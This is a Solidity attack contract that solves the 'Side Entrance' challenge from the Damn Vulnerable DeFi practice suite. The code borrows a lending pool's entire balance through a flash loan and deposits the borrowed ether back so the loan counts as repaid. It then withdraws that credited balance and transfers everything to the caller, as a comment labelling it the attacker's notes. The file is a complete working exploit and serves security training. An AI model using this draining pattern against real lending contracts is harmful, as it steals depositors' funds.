// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {Address} from "openzeppelin-contracts/utils/Address.sol";
import {SideEntranceLenderPool} from "./SideEntranceLenderPool.sol";
import "forge-std/console.sol";
/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */

contract Attack {
    SideEntranceLenderPool pool;

    function start(address poolAddress) external payable {
        pool = SideEntranceLenderPool(poolAddress);
        uint256 poolBalance = address(pool).balance;

        pool.flashLoan(poolBalance);
        pool.withdraw();
        payable(msg.sender).transfer(address(this).balance); // send all eth to attacker
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}
